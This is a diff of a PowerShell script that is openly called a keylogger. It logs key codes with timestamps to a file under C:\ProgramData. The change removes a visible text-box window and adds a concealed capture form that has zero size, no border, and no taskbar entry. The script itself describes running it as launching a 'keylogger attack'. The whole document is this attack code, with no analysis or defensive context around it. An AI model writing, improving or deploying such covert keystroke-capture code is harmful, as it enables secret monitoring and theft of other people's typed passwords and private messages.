@@ -1,56 +1,36 @@
 # Define the log file path for the keylogger
-$logFile = "C:\ProgramData\keylogger.log"
-$scriptName = "Keylogger.ps1"
+$logFile = "C:\ProgramData\keylogger.txt"
 
-# Function to log messages
-function Log-Message {
+# Function to log keystrokes
+function Log-KeyStroke {
     param (
-        [string]$message,
-        [string]$level = "INFO"
+        [string]$key
     )
     $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    $logEntry = "$timestamp [$level] [$scriptName] $message"
+    $logEntry = "$timestamp $key"
     Add-Content -Path $logFile -Value $logEntry
 }
 
-# Function to capture keystrokes
-function Capture-Keystrokes {
-    Log-Message "Starting keylogger."
-    try {
-        # Add a reference to the System.Windows.Forms assembly
-        Add-Type -AssemblyName System.Windows.Forms
+# Function to start the keylogger
+function Start-KeyLogger {
+    Add-Type -AssemblyName System.Windows.Forms
 
-        $keylogger = New-Object -TypeName System.Windows.Forms.TextBox
-        $keylogger.Multiline = $true
-        $keylogger.Width = 200
-        $keylogger.Height = 200
-        $keylogger.Top = 100
-        $keylogger.Left = 100
-        $keylogger.BackColor = [System.Drawing.Color]::White
-        $keylogger.ForeColor = [System.Drawing.Color]::Black
-        $keylogger.Font = New-Object System.Drawing.Font("Consolas", 12)
-        $keylogger.Add_KeyDown({
-            $key = $_.KeyCode
-            if ($key -eq [System.Windows.Forms.Keys]::Enter) {
-                $loggedKey = "`r`n"
-            } else {
-                $loggedKey = $key.ToString()
-            }
-            Log-Message $loggedKey
-        })
-        $form = New-Object System.Windows.Forms.Form
-        $form.Controls.Add($keylogger)
-        $form.ShowDialog()
-    } catch {
-        $errorMessage = "An error occurred while capturing keystrokes: $_"
-        Write-Host $errorMessage
-        Log-Message $errorMessage "ERROR"
-    }
-    Log-Message "Keylogger completed."
+    # Create a new form to capture keystrokes
+    $form = New-Object System.Windows.Forms.Form
+    $form.Size = New-Object System.Drawing.Size(0, 0)
+    $form.TopMost = $true
+    $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
+    $form.ShowInTaskbar = $false
+
+    # Add a key down event handler to the form
+    $form.add_KeyDown({
+        $key = $_.KeyCode
+        Log-KeyStroke $key
+    })
+
+    # Show the form
+    $form.ShowDialog()
 }
 
-# Log the action
-Log-Message "Launching keylogger attack."
-
-# Launch the keylogger attack
-Capture-Keystrokes
+# Start the keylogger
+Start-KeyLogger
